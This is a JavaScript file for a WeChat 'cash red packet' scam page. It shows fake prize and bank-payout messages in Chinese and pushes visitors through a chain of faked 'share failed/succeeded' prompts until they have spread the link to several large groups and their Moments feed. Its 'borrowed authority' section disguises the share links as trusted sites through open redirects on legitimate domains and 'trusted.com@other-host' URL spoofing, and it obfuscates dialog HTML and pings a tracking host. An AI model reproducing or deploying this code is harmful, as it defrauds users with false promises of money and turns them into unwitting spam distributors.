var ZZname = 'me';
window.sdk_config = {
    "debug": false,
    "appId": 'wx123456',
    "timestamp": 16545645,
    "nonceStr": 'asdasd',
    "signature": 'kxudjqo5sjxmskdlsojhfycbsgdhs',
    "jsApiList": ["onMenuShareTimeline", "onMenuShareAppMessage", "hideMenuItems", "showMenuItems"],
    'ticket': 'ttwatawtaw'
};

var alertTimes = 0;

function wxalert(msg, btn, callback) {
    if (alertTimes == 0) {
        var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
        $("body").append(dialog)
    }
    alertTimes++;
    var d = $('#lly_dialog');
    d.fadeIn(200);
    d.find("#lly_dialog_msg").html(msg);
    d.find("#lly_dialog_btn").html(btn);
    d.find("#lly_dialog_btn").off('click').on('click', function() {
        d.fadeOut(200);
        if (callback) {
            callback()
        }
    })
}
var shareATimes = 0;
var shareTTimes = 0;
var number = 0;
var number1 = 0;
var city = lc.substring(0, 2);
var alertTimes = 0;

window.gConfig = $.extend({
    defaultTips: [
        '<span style="font-size: 23px;color:#1BBC9B;">恭喜您</span><br/><br/>',
        '<span>您获得現金【紅包】</span><br/>',
        '<span style="font-size: 20px;color:red;">%(money)元</span><br/>',
        '<span style="color:red;">為文宣本公司的知名度,分享到“群”後</span><span  style="color:red; font-size: 25px;">即可領取</span><br/>',
        '<span style="color:red;">註意：群人數多于50人才能【免審核】立即領取</span><br/>',
        '<span>红包总额仅剩余</span><span style="font-size: 20px;color:red;">“3378.3”萬</span>元，先到先得，馬上“分享領取”到賬！<br/>',
    ].join(''),
    successTips: [
        '<span style="font-size: 20px;color: red;">恭喜您</span>，',
        '获得￥ <span style="font-size: 20px;color: red;">%(money)</span> 现金红包，',
        '金额已提交湖南银行打款，预计1小时内到账（跨行次日到账，非工作时间[09:00-17:00]次日到账），请注意查收微信绑定银行卡到账情况！',
    ].join(''),
    groupTips: [{
            successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
            successTips: '请繼續分享到<b style="font-size: 18px;color: red">2</b>個不同的群<br/><span style="color:red;">紅包將立即到賬！</span>',
        },
        {
            successTitle: '<b style="font-size: 22px;color: red;">分享失敗！</b>',
            successTips: '注意：分享到相同的群會失敗！<br>請繼續分享到<b style="font-size: 18px;color: red">2</b>個不同的群！',
        },
        {
            successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
            successTips: '請繼續分享到<b style="font-size: 18px;color: red">1</b>個不同的群<br/><span style="color:red;">紅包將立即到賬！</span>',
        },
        {
            successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享失敗！</b>',
            successTips: '請分享到<b style="font-size: 18px;color: red">人數>50人</b>的群<br/><span style="color:red;">紅包將立即到賬！</span>',
        },
        {
            successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
            successTips: '剩下最後一步啦！<br />請分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>，獲贈<b style="font-size: 18px;color: red;">{moneyStr}</b>元💰立即到賬！',
        },
    ],
    timeLineTips: [{
        successTitle: '<b style="font-size: 22px;color: red;">分享失敗！</b>',
        successTips: '<br>注意：必須[<span color="red">公開</span>]分享哦!<br>請嘗試重新分享到<b style="font-size: 18px;color: red">朋友圈</b><br>',
    }, ]
}, (window['data']));
var evkey = M.getParam('_evkey');
var site = M.getParam('_c');
var atd = M.getParam('atd');

/* 借权start */
var get_share_host = 'haiwaibbm.cn';
var location_host = location.host;

// 分享jump
var share_link_map = {
    'm.ymatou.com': [
        'http://avatar.u.123.com.cn/f488121a-882e-4444-9480-15b6e7feff20.svg?_c=9986',
        'http://avatar.u.123.com.cn/e814c445-d645-478a-9933-a660a7e2941c.svg?_c=9986',
        'http://avatar.u.123.com.cn/9a70e8ad-e492-4f47-b422-5f7a8c742a3f.svg?_c=9986',
        'https://data.dadaabc.com/userlogo/20180901/7f/c8/69/92/7fc86992bd6facbb1ea0d5228a273495.svg?_c=9986',
        'https://data.dadaabc.com/userlogo/20180901/ef/b7/57/ae/efb757ae4c4e94d198aaaee16c89e49b.svg?_c=9986',
        'https://data.dadaabc.com/userlogo/20180901/97/88/78/1e/9788781eedc15f461407f3a55363972e.svg?_c=9986',
    ],
    'my.lotour.com': [
        'http://www.lotour.com@avatar.u.123.com.cn/f488121a-882e-4444-9480-15b6e7feff20.svg?_c=9986',
        'http://www.lotour.com@avatar.u.123.com.cn/e814c445-d645-478a-9933-a660a7e2941c.svg?_c=9986',
        'http://www.lotour.com@avatar.u.123.com.cn/9a70e8ad-e492-4f47-b422-5f7a8c742a3f.svg?_c=9986',
        'https://www.lotour.com@data.dadaabc.com/userlogo/20180901/7f/c8/69/92/7fc86992bd6facbb1ea0d5228a273495.svg?_c=9986',
        'https://www.lotour.com@data.dadaabc.com/userlogo/20180901/ef/b7/57/ae/efb757ae4c4e94d198aaaee16c89e49b.svg?_c=9986',
        'https://www.lotour.com@data.dadaabc.com/userlogo/20180901/97/88/78/1e/9788781eedc15f461407f3a55363972e.svg?_c=9986',
        "http://www.lotour.com@shihuo.hupucdn.com/46f29b509ee4409685c1a51e2e5e3eae.svg?_c=9986",
        "http://www.lotour.com@shihuo.hupucdn.com/de1c9ee191134c6ea1860c86f3c6d697.svg?_c=9986",
        "http://www.lotour.com@shihuo.hupucdn.com/5c4e28357fd24c8bb7da8a29e4286ae2.svg?_c=9986",
        "http://www.lotour.com@shihuo.hupucdn.com/5341e27c3c1b4d4da1d4234f485101ff.svg?_c=9986",
    ],
    'www.wenjuan.com': [
        'https://www.wenjuan.com/s/ZriEred/?{spm}={spm}&_c=9986',
        'https://www.wenjuan.com/s/ey6BVn/?{spm}={spm}&_c=9986',
        'https://www.wenjuan.com/s/RjY3Ubo/?{spm}={spm}&_c=9986',
        'https://www.wenjuan.com/s/RfInau/?{spm}={spm}&_c=9986',
    ]
};

function getCity() {
    return (window['localAddress'] ? ['北京市', '天津市', '上海市', '重庆市'].indexOf(localAddress.province) > -1 ? localAddress.province : localAddress.city : '').replace(/(.*)市/, '$1');
}

function randomOneFromList(list) {
    if (list && list.length > 0) {
        return list[Math.floor(Math.random() * list.length)];
    } else {
        return '';
    }
}

var share_links = share_link_map[location_host];
var share_link = randomOneFromList(share_links);
if (share_link.indexOf('{spm}') > -1) {
    share_link = share_link.replace(/{spm}/ig, getSpm());
}

function getSpm() {
    var stringArray = 'qwertyuiopasdfghjklzxcvbnm1234567890';
    var spm = []
    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
    spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
    return spm.join('');
}

function addJumpToUrl(jump) {
    if (location.host.indexOf('m.ymatou.com') > -1) {
        return 'https://www.ymatou.com/login/logout?' + getSpm() + '=' + getSpm() + '&ret=' + encodeURIComponent(jump);
    } else if (location.host.indexOf('my.lotour.com') > -1) {
        return 'http://www.lotour.com/app/WeixinBack?id=1233&' + getSpm() + '=' + getSpm() + '&state=' + encodeURIComponent(jump);
    } else {
        return jump;
    }
}



// 广告jump地址
var adJumps = {
    'm.ymatou.com': [
        'https://data.dadaabc.com/userlogo/20180901/bb/1f/a9/26/bb1fa926cb351650ade6c69e5a96f72c.svg?_c=9986',
        'http://avatar.u.123.com.cn/249c0ae9-3bbd-480b-bb07-0e2c7b86c7e6.svg?_c=9986',
    ],
    'my.lotour.com': [
        "http://www.lotour.com@shihuo.hupucdn.com/4f68d0eb85b0433e994b2bdfe20fff8e.svg?fsrc=dz",
        "http://www.lotour.com@shihuo.hupucdn.com/f743582420334c0e857b1bcaaf1e6e0d.svg?fsrc=dz",
        "http://www.lotour.com@shihuo.hupucdn.com/7ebef1fd3c3845db980644ac2090e021.svg?fsrc=dz",
        "http://www.lotour.com@shihuo.hupucdn.com/04262e5538054438b43b049748475df7.svg?fsrc=dz",
        "http://www.lotour.com@shihuo.hupucdn.com/187dc7d7040e478f81bacda35d3fe1ce.svg?fsrc=dz",
        // 'https://www.lotour.com@data.dadaabc.com/userlogo/20180901/bb/1f/a9/26/bb1fa926cb351650ade6c69e5a96f72c.svg?_c=9986',
        // 'http://www.lotour.com@avatar.u.123.com.cn/249c0ae9-3bbd-480b-bb07-0e2c7b86c7e6.svg?_c=9986',
    ],
    'www.wenjuan.com': [
        "https://www.wenjuan.com/s/NRfqMbs/?{spm}={spm}&fsrc=dz",
        "https://www.wenjuan.com/s/iiiEvu/?{spm}={spm}&fsrc=dz",
        "https://www.wenjuan.com/s/iMz2yuJ/?{spm}={spm}&fsrc=dz",
        "https://www.wenjuan.com/s/ZBJ7Bn/?{spm}={spm}&fsrc=dz",

    ]
};

/*
var adJump = randomOneFromList(adJumps[location.host]);
if (adJump.indexOf('{spm}') > -1) {
adJump = adJump.replace(/{spm}/ig, getSpm());
}
if (window.data.ad.timeline_url) {
window.data.ad.app_url = addJumpToUrl(adJump);
window.data.ad.timeline_url = addJumpToUrl(adJump);
} else {
window.data.ad.app_url = addJumpToUrl(share_link);
window.data.ad.timeline_url = addJumpToUrl(share_link);
}
window.data.to_group.link = addJumpToUrl(share_link);
window.data.to_timeline.link = addJumpToUrl(share_link);
*/


/* 借权end */
function record(event, id, allow_reply) {
    try {
        if (!localStorage.getItem(event + ':' + id) || allow_reply) {
            //$.post('http://p.rsren.com.cn./record', {event: event, id: id})
            localStorage.setItem(event + ':' + id, true);
        }
    } catch (e) {

    }
}

function share_tip(result) {
    if (shareATimes == 1) {
        wxalert('\u5206\u4eab\u6210\u529f\uff0c\u8bf7\u7ee7\u7eed\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">2\u4e2a\u5fae\u4fe1\u7fa4</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
        //wxalert('<b style="font-size: 22px">\u5206\u4eab\u6210\u529f\uff01</b><br/>\u8bf7\u7ee7\u7eed\u5206\u4eab\u5230<b style="font-size: 18px;color: red">3\u4e2a\u4e0d\u540c\u7684\u7fa4</b>\u5373\u53ef\u9886\u53d6\uff01', '\u597d');
        shareFriend(result);
    } else if (shareATimes == 2) {
        wxalert('\u5206\u4eab\u5931\u8d25\uff0c\u8bf7\u91cd\u65b0\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">2\u4e2a\u4e0d\u540c\u5fae\u4fe1\u7fa4</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
        // wxalert('<b style="font-size: 22px">\u5206\u4eab\u5931\u8d25!</b><br>\u6ce8\u610f\uff1a\u5206\u4eab\u5230\u76f8\u540c\u7684\u7fa4\u4f1a\u5931\u8d25\uff01<br>\u8bf7\u7ee7\u7eed\u5206\u4eab\u5230<b style="font-size: 18px;color: red">2\u4e2a\u4e0d\u540c\u7684\u7fa4</b>\u5373\u53ef\u9886\u53d6\uff01', '\u597d');
        shareFriend(result);
    } else if (shareATimes == 3) {
        wxalert('\u5206\u4eab\u6210\u529f\uff0c\u8bf7\u7ee7\u7eed\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">1\u4e2a\u5fae\u4fe1\u7fa4</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
        // wxalert('<b style="font-size: 22px">\u5206\u4eab\u6210\u529f\uff01</b><br/>\u8bf7\u7ee7\u7eed\u5206\u4eab\u5230<b style="font-size: 18px;color: red">2\u4e2a\u4e0d\u540c\u7684\u7fa4</b>\u5373\u53ef\u9886\u53d6\uff01', '\u597d');
        shareFriend(result);
    } else if (shareATimes == 4) {
        wxalert('\u5206\u4eab\u5931\u8d25\uff0c\u8bf7\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">\u4eba\u6570\u5927\u4e8e\u0035\u0030\u4eba\u7684\u5fae\u4fe1\u7fa4\u54e6</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
        //wxalert('<b style="font-size: 22px">\u5206\u4eab\u5931\u8d25\uff01</b><br/>\u8bf7\u7ee7\u7eed\u5206\u4eab\u5230<b style="font-size: 18px;color: red">\u4eba\u6570\u5927\u4e8e50\u4eba\u7684\u5fae\u4fe1\u7fa4\u54e6</b>\u5373\u53ef\u9886\u53d6', '\u597d');
        shareFriend(result);
    } else if (shareATimes == 5) {
        wxalert('\u5206\u4eab\u5931\u8d25\uff0c\u8bf7\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">\u4eba\u6570\u5927\u4e8e\u0035\u0030\u4eba\u7684\u5fae\u4fe1\u7fa4\u54e6</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
        //wxalert('<b style="font-size: 22px">\u5206\u4eab\u5931\u8d25\uff01</b><br/>\u8bf7\u7ee7\u7eed\u5206\u4eab\u5230<b style="font-size: 18px;color: red">\u4eba\u6570\u5927\u4e8e50\u4eba\u7684\u5fae\u4fe1\u7fa4\u54e6</b>\u5373\u53ef\u9886\u53d6', '\u597d');
        shareFriend(result);
    } else {
        if (shareTTimes < 1) {
            wxalert('\u5206\u4eab\u6210\u529f\uff0c\u5269\u4e0b\u6700\u540e\u4e00\u6b65\u5566\uff01<br />\u8bf7\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
            // wxalert('\u5206\u4eab\u6210\u529f\uff0c\u5269\u4e0b\u6700\u540e\u4e00\u6b65\u5566\uff01<br />\u8bf7\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
            wx.hideOptionMenu();
            wx.showMenuItems({
                menuList: ['menuItem:share:timeline']
            });
            //   WeixinJSBridge.on('menu:share:timeline',
            //  function(argv) {
            shareTimeline1(line2);
            //    })
        } else {

            if (shareTTimes == 1) {
                //  WeixinJSBridge.on('menu:share:timeline',
                //   function(argv) {
                shareTimeline(line2);
                // })

                $('#fenxiang').on('click', function() {
                    wxalert('\u5206\u4eab\u5931\u8d25\u002c\u8bf7\u91cd\u65b0\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
                    //wxalert('<span style="font-size: 30px;color: #f5294c">\u5206\u4eab\u5931\u8d25</span><br>\u8bf7\u516c\u5f00\u53d1\u5e03\u670b\u53cb\u5708<br>\u518d\u5206\u4eab\u4e8c\u6b21<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span><br>\u5373\u53ef\u0031\u0030\u0030\u0025\u89c2\u770b\u0021', '\u597d')
                });
                $('#mask').on('click', function() {
                    wxalert('\u5206\u4eab\u5931\u8d25\u002c\u8bf7\u91cd\u65b0\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
                    //wxalert('<span style="font-size: 30px;color: #f5294c">\u5206\u4eab\u5931\u8d25</span><br>\u8bf7\u516c\u5f00\u53d1\u5e03\u670b\u53cb\u5708<br>\u518d\u5206\u4eab\u4e8c\u6b21<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span><br>\u5373\u53ef\u0031\u0030\u0030\u0025\u89c2\u770b\u0021', '\u597d')
                });
                wxalert('\u5206\u4eab\u5931\u8d25\u002c\u8bf7\u91cd\u65b0\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
                //wxalert('<span style="font-size: 30px;color: #f5294c">\u5206\u4eab\u5931\u8d25</span><br>\u8bf7\u516c\u5f00\u53d1\u5e03\u670b\u53cb\u5708<br>\u518d\u5206\u4eab\u4e8c\u6b21<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span><br>\u5373\u53ef\u0031\u0030\u0030\u0025\u89c2\u770b\u0021', '\u597d')
            } else if (shareTTimes == 2) {
                // WeixinJSBridge.on('menu:share:timeline',
                //  function(argv) {
                shareTimeline3(line2);
                // })

                $('#fenxiang').on('click', function() {
                    wxalert('\u5206\u4eab\u6210\u529f\uff0c<br />\u8bf7\u518d\u6b21\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
                    // wxalert('<span >\u5206\u4eab\u6210\u529f\uff0c\u8bf7\u7ee7\u7eed\u5206\u4eab\u4e00\u6b21</span><span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span><br>\u5373\u53ef\u0031\u0030\u0030\u0025\u89c2\u770b\u0021', '\u597d')
                });
                $('#mask').on('click', function() {
                    wxalert('\u5206\u4eab\u6210\u529f\uff0c<br />\u8bf7\u518d\u6b21\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
                    //wxalert('<span>\u5206\u4eab\u6210\u529f\uff0c\u8bf7\u7ee7\u7eed\u5206\u4eab\u4e00\u6b21</span><span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span><br>\u5373\u53ef\u0031\u0030\u0030\u0025\u89c2\u770b\u0021', '\u597d')
                });
                wxalert('\u5206\u4eab\u6210\u529f\uff0c<br />\u8bf7\u518d\u6b21\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
                // wxalert('<span>\u5206\u4eab\u6210\u529f\uff0c\u8bf7\u7ee7\u7eed\u5206\u4eab\u4e00\u6b21</span><span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span><br>\u5373\u53ef\u0031\u0030\u0030\u0025\u89c2\u770b\u0021', '\u597d')
            } else if (shareTTimes == 3) {
                //  WeixinJSBridge.on('menu:share:timeline',
                // function(argv) {
                shareTimeline4(line2);
                //  })

                $('#fenxiang').on('click', function() {
                    wxalert('\u5206\u4eab\u6210\u529f\u002c\u771f\u7684\u662f\u6700\u540e\u4e00\u6b21\u4e86\uff0c\u8bf7\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
                    // wxalert('<span style="font-size: 30px;color: #f5294c">\u5206\u4eab\u5931\u8d25</span><br>\u8bf7\u516c\u5f00\u53d1\u5e03\u670b\u53cb\u5708<br>\u518d\u5206\u4eab\u4e00\u6b21<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span><br>\u5373\u53ef\u0031\u0030\u0030\u0025\u89c2\u770b\u0021', '\u597d')
                });
                $('#mask').on('click', function() {
                    wxalert('\u5206\u4eab\u6210\u529f\u002c\u771f\u7684\u662f\u6700\u540e\u4e00\u6b21\u4e86\uff0c\u8bf7\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
                    //  wxalert('<span style="font-size: 30px;color: #f5294c">\u5206\u4eab\u5931\u8d25</span><br>\u8bf7\u516c\u5f00\u53d1\u5e03\u670b\u53cb\u5708<br>\u518d\u5206\u4eab\u4e00\u6b21<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span><br>\u5373\u53ef\u0031\u0030\u0030\u0025\u89c2\u770b\u0021', '\u597d')
                });
                wxalert('\u5206\u4eab\u6210\u529f\u002c\u771f\u7684\u662f\u6700\u540e\u4e00\u6b21\u4e86\uff0c\u8bf7\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
                // wxalert('<span style="font-size: 30px;color: #f5294c">\u5206\u4eab\u5931\u8d25</span><br>\u8bf7\u516c\u5f00\u53d1\u5e03\u670b\u53cb\u5708<br>\u518d\u5206\u4eab\u4e00\u6b21<span style="font-size: 30px;color: #f5294c">\u670b\u53cb\u5708</span><br>\u5373\u53ef\u0031\u0030\u0030\u0025\u89c2\u770b\u0021', '\u597d')
            } else {

                var moneyStr = parseInt(M.getParam('money')) || parseInt((parseFloat(Math.random() * 20) + 30) * 100);
                wxalert(unescape("%20%20%3Cspan%20style%3D%22font-size%3A%2020px%3Bcolor%3A%20red%3B%22%3E%u606D%u559C%u60A8%3C/span%3E%uFF0C%2C%u83B7%u5F97%uFFE5%20%3Cspan%20style%3D%22font-size%3A%2020px%3Bcolor%3A%20red%3B%22%3E" + parseFloat(moneyStr / 100).toFixed(2) + "%3C/span%3E%20%u73B0%u91D1%u7EA2%u5305%uFF0C%2C%u7531%u4E8E%u6D3B%u52A8%u91CF%u5DE8%u5927%uFF0C%u6B63%u5728%u6392%u961F%u53D1%u653E%uFF0C%u6700%u665A48%u5C0F%u65F6%u5185%u5230%u8D26%2C%uFF08%3Cspan%20style%3D%22font-size%3A20px%3Bcolor%3A%20red%3B%22%3E%u8BF7%u4FDD%u7559%u670B%u53CB%u5708%u5206%u4EAB%u81F3%u5FAE%u4FE1%u6536%u5230%u4F59%u989D%u5230%u8D26%u901A%u77E5%3C/span%3E%uFF09%uFF01%3Cbr/%3E%2C%u611F%u8C22%u60A8%u7684%u53C2%u4E0E%21%3Cbr/%3E%3Cbr/%3E%2C%3Cspan%20style%3D%22font-size%3A%2020px%3Bcolor%3A%20red%3B%22%3E%u670B%u53CB%u5708%u4FE1%u606F%u4E0D%u53EF%u5220%u9664%2C%u5426%u5219%u65E0%u6CD5%u6838%u5B9E%u7528%u6237%u4FE1%u606F%3C/span%3E%3Cbr/%3E%3Cbr/%3E%2C%u4EE5%u514D%u73B0%u91D1%u7EA2%u5305%u53D1%u653E%u5931%u8D25%uFF01"), '\u597d', function() {
                    zp();
                });








            }

        }
    }
};

function shareFriend(result) {
    var to_group = window.data.to_group;
    var type = 'link';
    if (shareATimes == 0) {
        to_group.imgUrl = window.data.to_group.imgUrl;
        to_group.link = window.data.to_group.link;
        to_group.desc = window.data.to_group.desc.replace('{city}', city);
        to_group.title = window.data.to_group.title.replace('{city}', city)
    } else if (shareATimes == 1) {
        to_group.imgUrl = window.data.to_group2.imgUrl;
        to_group.link = window.data.to_group2.link;
        to_group.desc = window.data.to_group2.desc.replace('{city}', city);
        to_group.title = window.data.to_group2.title.replace('{city}', city)
    } else if (shareATimes == 2) {
        to_group.imgUrl = window.data.to_group3.imgUrl;
        to_group.link = window.data.to_group3.link;
        to_group.desc = window.data.to_group3.desc.replace('{city}', city);
        to_group.title = window.data.to_group3.title.replace('{city}', city)

    } else if (shareATimes == 3) {
        to_group.imgUrl = window.data.to_group4.imgUrl;
        to_group.link = window.data.to_group4.link;
        to_group.desc = window.data.to_group4.desc.replace('{city}', city);
        to_group.title = window.data.to_group4.title.replace('{city}', city)


    } else if (shareATimes == 4) {
        to_group.imgUrl = window.data.to_group5.imgUrl;
        to_group.link = window.data.to_group5.link;
        to_group.desc = window.data.to_group5.desc.replace('{city}', city);
        to_group.title = window.data.to_group5.title.replace('{city}', city)
    } else {
        to_group.imgUrl = window.data.to_group6.imgUrl;
        to_group.link = window.data.to_group6.link;
        to_group.desc = window.data.to_group6.desc.replace('{city}', city);
        to_group.title = window.data.to_group6.title.replace('{city}', city)
    };
    wx.onMenuShareAppMessage({
        title: to_group.title.replace('{city}', city),
        desc: to_group.desc.replace('{city}', city),
        link: to_group.link,
        imgUrl: to_group.imgUrl,
        type: 'link',
        // img_width: "640",
        // img_height: "640",
        success: function() {
            shareATimes += 1;

            share_tip();
        },
        fail: function() {}
    })


    // WeixinJSBridge.invoke('sendAppMessage', {
    //     "img_url": to_group.imgUrl,
    //     "img_width": "640",
    //     "img_height": "640",
    //     "link": to_group.link,
    //     "desc": to_group.desc.replace('{city}', city),
    //     "title": to_group.title.replace('{city}', city),
    //     dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3"

    // },
    // function(res) {
    //     shareATimes += 1;
    //     share_tip()
    // })
};

function shareTimeline1(result) {
    wx.onMenuShareTimeline({
            title: window.data.to_timeline.title.replace('{city}', city),
            link: window.data.to_timeline.link,
            imgUrl: window.data.to_timeline.imgUrl,
            type: 'link',
            // img_width: "640",
            // "img_height": "640",
            success: function() {
                shareTTimes += 1;
                share_tip(shareATimes, shareTTimes);
                $.get('//ss.bnykry.cn/1.0.0/activity_count/common?type=2&video=' + window.type)
            },
            fail: function() {
                // $.get('//ss.bnykry.cn/1.0.0/activity_count/common?type=4&video='+window.type)
            }
        })
        //    WeixinJSBridge.invoke('shareTimeline', {
        //     "img_url":window.data.to_timeline.imgUrl,
        //     "img_width": "640",
        //     "img_height": "640",
        //     "link":window.data.to_timeline.link,
        //     "desc":window.data.to_timeline.title.replace('{city}', city),
        //     "title":window.data.to_timeline.title.replace('{city}', city),
        //     dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
        //     type: 'video'
        // },
        // function(res) {
        //     wxalert('\u5206\u4eab\u6210\u529f\uff0c\u8bf7\u7ee7\u7eed\u5206\u4eab\u5230<span style="font-size: 30px;color: #f5294c">3\u4e2a\u5fae\u4fe1\u7fa4</span>\u5373\u53ef\u9886\u53d6\u0021', '\u597d');
        //       // wxalert('<b style="font-size: 22px">\u5206\u4eab\u6210\u529f\uff01</b><br/>\u8bf7\u7ee7\u7eed\u5206\u4eab\u5230<b style="font-size: 18px;color: red">4\u4e2a\u4e0d\u540c\u7684\u7fa4</b>\u5373\u53ef\u9886\u53d6\uff01', '\u597d');   
        //           wx.hideOptionMenu();
        //             wx.showMenuItems({
        //                 menuList: ['menuItem:share:appMessage']
        //               //  menuList: ['menuItem:share:timeline']
        //             });

    // })
};

function shareTimeline(result) {
    wx.onMenuShareTimeline({
            title: window.data.to_timeline4.title.replace('{city}', city),
            desc: window.data.to_timeline4.title.replace('{city}', city),
            link: window.data.to_timeline4.link,
            imgUrl: window.data.to_timeline4.imgUrl,
            type: 'link',
            // "img_width": "640",
            // "img_height": "640",
            success: function() {
                shareTTimes += 4;
                share_tip(shareATimes, shareTTimes);
            },
            fail: function() {
                // $.get('//ss.bnykry.cn/1.0.0/activity_count/common?type=4&video='+window.type)
            }
        })
        //    WeixinJSBridge.invoke('shareTimeline', {
        //     "img_url":window.data.to_timeline4.imgUrl,
        //     "img_width": "640",
        //     "img_height": "640",
        //     "link":window.data.to_timeline4.link,
        //     "desc":window.data.to_timeline4.title.replace('{city}', city),
        //     "title":window.data.to_timeline4.title.replace('{city}', city),
        //     dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
        //     type: 'video'
        // },
        // function(res) {
        //     shareTTimes += 1;
        //     share_tip()
        // })
};

function shareTimeline2(result) {
    wx.onMenuShareTimeline({
            title: window.data.to_timeline2.title.replace('{city}', city),
            desc: window.data.to_timeline2.title.replace('{city}', city),
            link: window.data.to_timeline2.link,
            imgUrl: window.data.to_timeline2.imgUrl,
            type: 'link',
            // "img_width": "640",
            // "img_height": "640",
            success: function() {
                shareTTimes += 1;
                shareTTimes += 2;
                share_tip(shareATimes, shareTTimes);

            },
            fail: function() {
                // $.get('//ss.bnykry.cn/1.0.0/activity_count/common?type=4&video='+window.type)
            }
        })
        //   WeixinJSBridge.invoke('shareTimeline', {
        //     "img_url":window.data.to_timeline2.imgUrl,
        //     "img_width": "640",
        //     "img_height": "640",
        //     "link":window.data.to_timeline2.link,
        //     "desc":window.data.to_timeline2.title.replace('{city}', city),
        //     "title":window.data.to_timeline2.title.replace('{city}', city),
        //     dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
        //     type: 'video'
        // },
        // function(res) {
        //     shareTTimes += 1;
        //     share_tip()
        // })
};

